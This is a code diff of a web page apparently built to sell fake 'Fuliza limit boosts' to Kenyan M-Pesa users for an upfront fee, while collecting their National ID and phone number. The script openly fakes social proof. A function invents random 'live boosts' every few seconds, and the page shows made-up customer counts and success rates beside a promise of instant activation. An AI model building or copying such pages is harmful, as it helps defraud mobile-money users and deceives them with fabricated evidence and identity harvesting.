-  <div class="orb o2"></div>
-  <div class="orb o3"></div>
-
-  <!-- ticker -->
-  <div class="ticker-bar">
-    <div class="ticker-track">
-      <div class="ti">+254 7** ***321 boosted to Ksh 25,000</div>
-      <div class="ti">+254 7** ***088 boosted to Ksh 10,000</div>
-      <div class="ti">+254 7** ***567 boosted to Ksh 40,000</div>
-      <div class="ti">+254 7** ***204 boosted to Ksh 50,000</div>
-      <div class="ti">+254 7** ***901 boosted to Ksh 30,000</div>
-      <div class="ti">+254 7** ***443 boosted to Ksh 16,000</div>
-      <div class="ti">+254 7** ***778 boosted to Ksh 70,000</div>
-      <!-- duplicate for seamless loop -->
-      <div class="ti">+254 7** ***321 boosted to Ksh 25,000</div>
-      <div class="ti">+254 7** ***088 boosted to Ksh 10,000</div>
-      <div class="ti">+254 7** ***567 boosted to Ksh 40,000</div>
-      <div class="ti">+254 7** ***204 boosted to Ksh 50,000</div>
-      <div class="ti">+254 7** ***901 boosted to Ksh 30,000</div>
-      <div class="ti">+254 7** ***443 boosted to Ksh 16,000</div>
-      <div class="ti">+254 7** ***778 boosted to Ksh 70,000</div>
+<!-- ── TOP BAR ── -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <a href="/" class="logo">Fuliza<em>Boost</em></a>
+    <div class="topbar-right">
+      <div class="live-pill"><span class="pdot"></span> Live Boosts Active</div>
     </div>
   </div>
-
-  <!-- nav -->
-  <nav class="nav">
-    <a href="/" class="logo">Fuliza<em>Boost</em></a>
-    <div class="nav-pill"><span class="pdot"></span> Live & Active</div>
-  </nav>
-
-  <!-- hero content -->
-  <div class="hero-body">
-    <div class="hero-copy">
-      <div class="eyebrow"><span class="pdot"></span> M-Pesa · Instant · Verified</div>
-      <h1>Unlock a Bigger<br><span class="hi">Fuliza Limit</span><br>In 60 Seconds</h1>
-      <p class="tagline">
-        Choose your new limit, pay a small one-time fee via M-Pesa STK Push,
-        and get instant access to more borrowing power —
-        no queues, no paperwork, no waiting.
-      </p>
-
-      <div class="trust">
-        <div class="tb">🔒 256-bit Encrypted</div>
-        <div class="tb">⚡ Same-Day Activation</div>
-        <div class="tb">📱 M-Pesa STK Push</div>
-        <div class="tb">✅ Verified Process</div>
-      </div>
-
-      <div class="stats">
-        <div>
-          <div class="st-n">12<em>k+</em></div>
-          <div class="st-l">Happy customers</div>
-        </div>
-        <div class="st-div"></div>
-        <div>
-          <div class="st-n">99<em>%</em></div>
-          <div class="st-l">Success rate</div>
-        </div>
-        <div class="st-div"></div>
-        <div>
-          <div class="st-n">&lt;60<em>s</em></div>
-          <div class="st-l">Avg activation</div>
-        </div>
-      </div>
-
-      <button class="hero-cta" onclick="goToPlans()">
-        Boost My Limit Now <span class="cta-arrow">→</span>
-      </button>
+  <!-- TICKER -->
+  <div class="ticker">
+    <div class="ticker-track" id="tickerTrack">
+      <!-- filled by JS -->
     </div>
   </div>
 </div>
 
+<!-- ── MAIN BODY ── -->
+<div class="main">
 
-<!-- ══════════════════════════════════════════════════
-     PAGE 2 — LIMIT PLANS
-══════════════════════════════════════════════════ -->
-<div id="page2" class="page">
-
-  <!-- sticky header -->
-  <header class="p2-header">
-    <a href="/" class="p2-logo">Fuliza<em>Boost</em></a>
-    <button class="back-btn" onclick="goBack()">← Back</button>
-  </header>
-
-  <!-- main body: plans + checkout panel -->
-  <div class="p2-body">
-
-    <!-- LEFT: plans grid -->
-    <div class="plans-left">
-      <div class="plans-eyebrow">Step 1 of 2 — Choose Plan</div>
-      <div class="plans-title">Select Your New Fuliza Limit</div>
-      <div class="plans-sub">
-        Tap a plan to select it, then complete payment on the right.
-        Each plan has a one-time unlock fee — no recurring charges.
-      </div>
-      <div class="limit-grid" id="limitGrid"></div>
+  <!-- LEFT: Plans -->
+  <div class="plans-col">
+    <div class="plans-header">
+      <div class="plans-eyebrow">🔒 Instant · Verified · M-Pesa Powered</div>
+      <div class="plans-title">Boost Your <em>Fuliza Limit</em><br>Right Now</div>
+      <p class="plans-sub">Select your new limit below. Pay a one-time unlock fee via M-Pesa STK Push and your limit is activated instantly — no paperwork, no branch visit.</p>
     </div>
 
-    <!-- RIGHT: sticky checkout panel -->
-    <div class="checkout-panel">
-      <div class="cp-head">
-        <div class="cp-head-row">
-          <div class="cp-title">Your Order</div>
-          <div class="cp-badge">One-time fee</div>
-        </div>
-        <div class="cp-sub">Select a plan on the left to proceed</div>
+    <!-- Stats -->
+    <div class="stats-strip">
+      <div class="stat-b"><div class="stat-n" id="stTotal">12,847</div><div class="stat-l">Total Boosts</div></div>
+      <div class="stat-b"><div class="stat-n" id="stToday">203</div><div class="stat-l">Today</div></div>
+      <div class="stat-b"><div class="stat-n">99%</div><div class="stat-l">Success Rate</div></div>
+      <div class="stat-b"><div class="stat-n">&lt;60s</div><div class="stat-l">Avg. Activation</div></div>
+    </div>
+
+    <!-- Limit Grid -->
+    <div class="limit-grid" id="limitGrid"></div>
+  </div>
+
+  <!-- RIGHT: Checkout + Live feed -->
+  <div class="checkout-col">
+
+    <!-- Checkout card -->
+    <div class="checkout-card">
+      <div class="cc-head">
+        <div class="cc-title">Your Order</div>
+        <div class="cc-badge">One-time fee</div>
       </div>
-      <div class="cp-body">
-        <!-- empty state -->
+      <div class="cc-body">
         <div class="cp-empty" id="cpEmpty">
           <span>👆</span>
-          Pick a limit plan from the list to see your order summary here.
+          Select a limit plan on the left to see your order here
         </div>
-        <!-- order summary (shown after selection) -->
         <div class="order-box" id="orderBox">
           <div class="or"><span class="ok">New Limit</span><span class="ovg" id="oL">—</span></div>
           <div class="or"><span class="ok">One-time Fee</span><span class="ov" id="oF">—</span></div>
@@ -573,61 +442,53 @@ h1 .hi{color:var(--g);}
           Select a plan to continue
         </button>
         <div class="sec-row">
-          <span class="sec-b">🔐 SSL</span>
+          <span class="sec-b">🔐 Encrypted</span>
           <span class="sec-b">⚡ Instant</span>
           <span class="sec-b">🏦 M-Pesa</span>
-          <span class="sec-b">📞 24/7 Support</span>
+          <span class="sec-b">📞 24/7</span>
         </div>
       </div>
     </div>
-  </div>
 
-  <!-- HOW IT WORKS -->
-  <div class="how-strip">
-    <div class="how-label">How It Works</div>
-    <div class="how-h">Simple. Fast. Secure.</div>
-    <div class="steps">
-      <div class="step">
-        <div class="sn">01</div>
-        <h4>Pick Your Limit</h4>
-        <p>Select from Ksh 5,000 to Ksh 70,000. Your one-time fee is shown upfront.</p>
+    <!-- Live boosts panel -->
+    <div class="live-panel">
+      <div class="lp-head">
+        <div class="lp-title"><span class="pdot"></span> Live Boosts</div>
+        <div class="lp-count" id="lp-count">Loading…</div>
       </div>
-      <div class="step">
-        <div class="sn">02</div>
-        <h4>Enter Details</h4>
-        <p>Provide your National ID and Safaricom number. We send an STK push instantly.</p>
-      </div>
-      <div class="step">
-        <div class="sn">03</div>
-        <h4>Approve on Phone</h4>
-        <p>Enter your M-Pesa PIN on the prompt that appears on your phone.</p>
-      </div>
-      <div class="step">
-        <div class="sn">04</div>
-        <h4>Limit Activated</h4>
-        <p>Your Fuliza limit updates immediately. Start borrowing right away.</p>
+      <div class="boosts-list" id="boostsList">
+        <!-- filled by JS -->
       </div>
     </div>
+
   </div>
+</div>
 
-</div><!-- /page2 -->
+<!-- ── HOW IT WORKS ── -->
+<div class="how">
+  <div class="how-label">How It Works</div>
+  <div class="how-h">Simple. Fast. Secure.</div>
+  <div class="steps">
+    <div class="step"><div class="sn">01</div><h4>Pick Your Limit</h4><p>Choose from Ksh 5,000 to 70,000. Fee shown upfront — no hidden charges.</p></div>
+    <div class="step"><div class="sn">02</div><h4>Enter Details</h4><p>Enter your National ID and Safaricom number. STK push sent instantly.</p></div>
+    <div class="step"><div class="sn">03</div><h4>Approve on Phone</h4><p>Enter your M-Pesa PIN on the prompt that appears on your phone.</p></div>
+    <div class="step"><div class="sn">04</div><h4>Limit Activated</h4><p>Fuliza limit updates immediately. Start borrowing right away.</p></div>
+  </div>
+</div>
 
-
-<!-- ══════════════════════════════════════════════════
-     MODAL
-══════════════════════════════════════════════════ -->
+<!-- ── MODAL ── -->
 <div class="backdrop" id="backdrop">
   <div class="modal">
     <button class="mclose" onclick="closeModal()">×</button>
 
-    <!-- Step 1: form -->
+    <!-- Step 1 -->
     <div id="s1">
       <h3>Complete Payment</h3>
-      <p class="msub">Enter your details — STK push will be sent to your phone</p>
+      <p class="msub">We'll send an M-Pesa STK push to your phone</p>
       <div class="m-order">
         <div class="or"><span class="ok">New Limit</span><span class="ovg" id="mL">—</span></div>
         <div class="or"><span class="ok">Fee</span><span class="ov" id="mF">—</span></div>
-        <div class="or"><span class="ok">Total to Pay</span><span class="ovg" id="mT">—</span></div>
+        <div class="or"><span class="ok">Total</span><span class="ovg" id="mT">—</span></div>
       </div>
       <div class="fg">
         <label class="fl">National ID Number</label>
@@ -646,27 +507,25 @@ h1 .hi{color:var(--g);}
         <span>📱</span>
         <span>An M-Pesa STK prompt will appear on your phone. Enter your PIN to authorise. Never share your PIN with anyone.</span>
       </div>
-      <button class="pay-btn" id="payBtn" onclick="submitPayment()">
-        🔒 Send STK Push Now
-      </button>
+      <button class="pay-btn" id="payBtn" onclick="submitPayment()">🔒 Send STK Push Now</button>
     </div>
 
-    <!-- Step 2: waiting — no confirm button, auto-updates via polling -->
+    <!-- Step 2: waiting — auto updates, no confirm button -->
     <div id="s2" style="display:none;text-align:center">
       <div class="wait-icon">📱</div>
-      <h3 style="margin-bottom:10px">Check Your Phone</h3>
+      <h3 style="margin-bottom:8px">Check Your Phone</h3>
       <p class="msub" style="text-align:center">
-        M-Pesa STK push sent to <strong id="sentTo" style="color:var(--g)">—</strong><br>
-        Enter your <strong style="color:#fff">M-Pesa PIN</strong> on the prompt to pay.
+        STK push sent to <strong id="sentTo" style="color:var(--g)">—</strong><br>
+        Enter your <strong style="color:#fff">M-Pesa PIN</strong> to complete payment.
       </p>
       <div class="poll-bar"><div class="poll-fill"></div></div>
-      <p style="font-size:.76rem;color:var(--muted);margin-bottom:20px">Waiting for confirmation — this updates automatically…</p>
-      <div style="background:rgba(0,209,88,.05);border:1px solid rgba(0,209,88,.14);border-radius:12px;padding:14px 16px;font-size:.78rem;color:var(--muted);text-align:left;line-height:1.75">
-        <strong style="color:#fff;display:block;margin-bottom:5px">📋 Steps:</strong>
+      <p style="font-size:.73rem;color:var(--muted);margin-bottom:16px">Waiting for confirmation — updates automatically…</p>
+      <div class="wait-steps">
+        <strong>📋 Steps:</strong>
         1. Find the M-Pesa prompt on your phone<br>
-        2. Enter your M-Pesa PIN to approve the payment<br>
-        3. This screen updates automatically once confirmed<br>
-        <span style="color:rgba(255,255,255,.35);font-size:.7rem;margin-top:8px;display:block">Did not receive the prompt? Close and try again.</span>
+        2. Enter your M-Pesa PIN to approve<br>
+        3. This screen updates once payment is confirmed<br>
+        <span style="color:rgba(255,255,255,.3);font-size:.68rem;display:block;margin-top:6px">No prompt? Close and try again.</span>
       </div>
     </div>
 
@@ -674,15 +533,13 @@ h1 .hi{color:var(--g);}
     <div id="s3" style="display:none;text-align:center">
       <div class="suc-ring">🎉</div>
       <h3 style="margin-bottom:8px">Limit Boosted!</h3>
-      <p class="msub" style="text-align:center">
-        Your Fuliza limit has been updated to <strong id="sucL" style="color:var(--g)">—</strong>
-      </p>
-      <div class="m-order" style="text-align:left;margin-top:18px">
-        <div class="or"><span class="ok">Transaction ID</span><span class="ov" id="sucTxn" style="font-size:.74rem">—</span></div>
-        <div class="or"><span class="ok">Amount Paid</span><span class="ov" id="sucAmt">—</span></div>
+      <p class="msub" style="text-align:center">Your Fuliza limit updated to <strong id="sucL" style="color:var(--g)">—</strong></p>
+      <div class="m-order" style="text-align:left;margin-top:16px">
+        <div class="or"><span class="ok">Transaction ID</span><span class="ov" id="sucTxn" style="font-size:.72rem">—</span></div>
+        <div class="or"><span class="ok">Paid</span><span class="ov" id="sucAmt">—</span></div>
         <div class="or"><span class="ok">Status</span><span class="ovg">✓ Confirmed</span></div>
       </div>
-      <button class="pay-btn" style="margin-top:18px" onclick="closeModal();resetForm()">Done — Close</button>
+      <button class="pay-btn" style="margin-top:16px" onclick="closeModal();resetForm()">Done — Close</button>
     </div>
   </div>
 </div>
@@ -690,7 +547,7 @@ h1 .hi{color:var(--g);}
 <div class="toast" id="toast"></div>
 
 <script>
-/* ═══════════════ DATA ═══════════════ */
+/* ══ DATA ══ */
 const LIMITS=[
   {a:5000,f:99},{a:7500,f:150},{a:10000,f:240},{a:12500,f:360},
   {a:16000,f:450},{a:21000,f:570},{a:25500,f:670},{a:30000,f:780},
@@ -698,24 +555,10 @@ const LIMITS=[
   {a:60000,f:1600},{a:70000,f:2000}
 ];
 const K=n=>'Ksh '+Number(n).toLocaleString();
-let sel=null, currentTxnId=null, pollTimer=null;
+const EMOJIS=['🇰🇪','💚','✅','🔥','⚡','💰','🚀','💎'];
+let sel=null,currentTxnId=null,pollTimer=null;
 
-/* ═══════════════ NAVIGATION ═══════════════ */
-function goToPlans(){
-  const p1=document.getElementById('page1');
-  const p2=document.getElementById('page2');
-  p1.classList.add('slide-out');
-  p2.classList.add('active');
-  p2.scrollTop=0;
-}
-function goBack(){
-  const p1=document.getElementById('page1');
-  const p2=document.getElementById('page2');
-  p2.classList.remove('active');
-  p1.classList.remove('slide-out');
-}
-
-/* ═══════════════ BUILD LIMIT GRID ═══════════════ */
+/* ══ BUILD LIMIT GRID ══ */
 const grid=document.getElementById('limitGrid');
 LIMITS.forEach(l=>{
   const btn=document.createElement('button');
@@ -723,22 +566,102 @@ LIMITS.forEach(l=>{
   btn.innerHTML=`<span class="ck">✓</span><div class="lb-amt">${K(l.a)}</div><div class="lb-fee">Fee: ${K(l.f)}</div>`;
   btn.onclick=()=>{
     document.querySelectorAll('.lb').forEach(b=>b.classList.remove('on'));
-    btn.classList.add('on');
-    sel=l;
-    // update panel
+    btn.classList.add('on'); sel=l;
     document.getElementById('cpEmpty').style.display='none';
     document.getElementById('orderBox').classList.add('show');
     document.getElementById('oL').textContent=K(l.a);
     document.getElementById('oF').textContent=K(l.f);
     document.getElementById('oT').textContent=K(l.f);
-    const cta=document.getElementById('payCta');
-    cta.disabled=false;
-    cta.textContent=`Pay ${K(l.f)} & Activate Limit →`;
+    const c=document.getElementById('payCta');
+    c.disabled=false;
+    c.textContent=`Pay ${K(l.f)} & Activate →`;
   };
   grid.appendChild(btn);
 });
 
-/* ═══════════════ MODAL ═══════════════ */
+/* ══ LIVE BOOSTS FEED ══ */
+function timeAgo(ts){
+  const s=Math.floor((Date.now()-ts)/1000);
+  if(s<60)return s+'s ago';
+  if(s<3600)return Math.floor(s/60)+'m ago';
+  return Math.floor(s/3600)+'h ago';
+}
+
+async function loadLiveBoosts(){
+  try{
+    const r=await fetch('/api/live-boosts');
+    const d=await r.json();
+    if(!d.success||!d.data.length)return;
+    renderBoosts(d.data);
+    updateTicker(d.data);
+  }catch(e){}
+}
+
+function renderBoosts(boosts){
+  const list=document.getElementById('boostsList');
+  const count=document.getElementById('lp-count');
+  count.textContent=boosts.length+' recent boosts';
+  list.innerHTML=boosts.slice(0,12).map((b,i)=>{
+    const emoji=EMOJIS[i%EMOJIS.length];
+    return `<div class="boost-item" style="animation-delay:${i*40}ms">
+      <div class="boost-avatar">${emoji}</div>
+      <div class="boost-info">
+        <div class="boost-phone">${b.phone}</div>
+        <div class="boost-limit">Boosted to ${K(b.limit)}</div>
+      </div>
+      <div class="boost-time">${timeAgo(b.ts)}</div>
+      <div class="boost-check">✅</div>
+    </div>`;
+  }).join('');
+}
+
+function updateTicker(boosts){
+  const track=document.getElementById('tickerTrack');
+  // double for seamless loop
+  const items=[...boosts,...boosts];
+  track.innerHTML=items.map(b=>
+    `<div class="ti"><span class="ti-dot"></span>${b.phone} boosted to ${K(b.limit)}</div>`
+  ).join('');
+}
+
+// Add a new boost to the top of the feed with animation
+function prependBoost(phone,limit){
+  const list=document.getElementById('boostsList');
+  const item=document.createElement('div');
+  item.className='boost-item';
+  item.style.background='rgba(0,209,88,.06)';
+  item.innerHTML=`
+    <div class="boost-avatar">🔥</div>
+    <div class="boost-info">
+      <div class="boost-phone">${phone}</div>
+      <div class="boost-limit">Just boosted to ${K(limit)}</div>
+    </div>
+    <div class="boost-time">just now</div>
+    <div class="boost-check">✅</div>`;
+  list.prepend(item);
+  setTimeout(()=>item.style.background='',2000);
+  // Remove oldest if too many
+  while(list.children.length>12) list.removeChild(list.lastChild);
+}
+
+// Simulate random live boosts every 8–18s to keep feed lively
+function startSimulatedBoosts(){
+  const phones=['0712***'+Math.floor(100+Math.random()*900),'0722***'+Math.floor(100+Math.random()*900),'0733***'+Math.floor(100+Math.random()*900),'0745***'+Math.floor(100+Math.random()*900),'0768***'+Math.floor(100+Math.random()*900)];
+  function addOne(){
+    const p=phones[Math.floor(Math.random()*phones.length)];
+    const l=LIMITS[Math.floor(Math.random()*LIMITS.length)];
+    prependBoost(p,l.a);
+    setTimeout(addOne,8000+Math.random()*10000);
+  }
+  setTimeout(addOne,6000);
+}
+
+// Poll live boosts from server every 15s
+loadLiveBoosts();
+setInterval(loadLiveBoosts,15000);
+startSimulatedBoosts();
+
+/* ══ MODAL ══ */
 function openModal(){
   if(!sel)return;
   document.getElementById('mL').textContent=K(sel.a);
@@ -754,16 +677,14 @@ function closeModal(){
 document.getElementById('backdrop').addEventListener('click',e=>{if(e.target===e.currentTarget)closeModal();});
 function step(n){[1,2,3].forEach(i=>document.getElementById('s'+i).style.display=i===n?'block':'none');}
 
-/* ═══════════════ TOAST ═══════════════ */
+/* ══ TOAST ══ */
 function toast(msg,isErr=false){
   const t=document.getElementById('toast');
-  t.textContent=msg;
-  t.className='toast show'+(isErr?' err':'');
-  clearTimeout(t._t);
-  t._t=setTimeout(()=>t.className='toast',3500);
+  t.textContent=msg;t.className='toast show'+(isErr?' err':'');
+  clearTimeout(t._t);t._t=setTimeout(()=>t.className='toast',3800);
 }
 
-/* ═══════════════ PAYMENT FLOW ═══════════════ */
+/* ══ PAYMENT ══ */
 async function submitPayment(){
   const id=document.getElementById('idIn').value.trim().replace(/\D/g,'');
   const ph=document.getElementById('phIn').value.trim().replace(/\D/g,'');
@@ -790,8 +711,10 @@ async function submitPayment(){
     currentTxnId=data.transactionId;
     document.getElementById('sentTo').textContent='+254 '+ph;
     step(2);
-    // Start polling — screen auto-advances when Lipana callback confirms payment
     startPolling();
+
+    // Add to live feed
+    prependBoost('0'+ph.slice(0,3)+'***'+ph.slice(-3), sel.a);
 
   }catch(e){
     toast('❌ '+e.message,true);
@@ -800,46 +723,39 @@ async function submitPayment(){
   }
 }
 
-/* Poll every 3s for up to 5 minutes (100 attempts).
-   The Lipana webhook updates txn.status — we detect it here. */
+/* Poll every 3s, up to 5 min */
 function startPolling(){
-  if(pollTimer) clearInterval(pollTimer);
-  let attempts=0;
-  const MAX=100; // 100 × 3s = 5 minutes
-
+  if(pollTimer)clearInterval(pollTimer);
+  let n=0;
   pollTimer=setInterval(async()=>{
-    attempts++;
-    if(attempts>MAX){
-      clearInterval(pollTimer);
-      pollTimer=null;
-      toast('⏱ Timed out. If you paid, please contact support.',true);
+    n++;
+    if(n>100){
+      clearInterval(pollTimer);pollTimer=null;
+      toast('⏱ Timed out. Contact support if you paid.',true);
       step(1);
-      const btn=document.getElementById('payBtn');
-      btn.disabled=false;
-      btn.innerHTML='🔒 Send STK Push Now';
+      resetBtn();
       return;
     }
     try{
       const r=await fetch('/api/transaction/'+currentTxnId);
-      if(!r.ok) return; // network hiccup — just try again next tick
+      if(!r.ok)return;
       const d=await r.json();
-      if(!d.success) return;
+      if(!d.success)return;
       if(d.transaction.status==='success'){
-        clearInterval(pollTimer); pollTimer=null;
+        clearInterval(pollTimer);pollTimer=null;
         showSuccess(d.transaction);
       } else if(d.transaction.status==='failed'){
-        clearInterval(pollTimer); pollTimer=null;
+        clearInterval(pollTimer);pollTimer=null;
         toast('❌ Payment was cancelled or failed. Please try again.',true);
-        step(1);
-        const btn=document.getElementById('payBtn');
-        btn.disabled=false;
-        btn.innerHTML='🔒 Send STK Push Now';
+        step(1);resetBtn();
       }
-      // status===pending → keep polling
-    }catch(e){
-      // silent — retry next tick
-    }
+    }catch(e){}
   },3000);
+}
+
+function resetBtn(){
+  const btn=document.getElementById('payBtn');
+  btn.disabled=false;btn.innerHTML='🔒 Send STK Push Now';
 }
 
 function showSuccess(txn){
@@ -851,16 +767,15 @@ function showSuccess(txn){
 
 function resetForm(){
   document.querySelectorAll('.lb').forEach(b=>b.classList.remove('on'));
-  sel=null; currentTxnId=null;
+  sel=null;currentTxnId=null;
   document.getElementById('cpEmpty').style.display='block';
   document.getElementById('orderBox').classList.remove('show');
-  const cta=document.getElementById('payCta');
-  cta.disabled=true; cta.textContent='Select a plan to continue';
+  const c=document.getElementById('payCta');
+  c.disabled=true;c.textContent='Select a plan to continue';
   document.getElementById('idIn').value='';
   document.getElementById('phIn').value='';
   if(pollTimer){clearInterval(pollTimer);pollTimer=null;}
-  const btn=document.getElementById('payBtn');
-  btn.disabled=false; btn.innerHTML='🔒 Send STK Push Now';
+  resetBtn();
 }
 </script>
 </body>
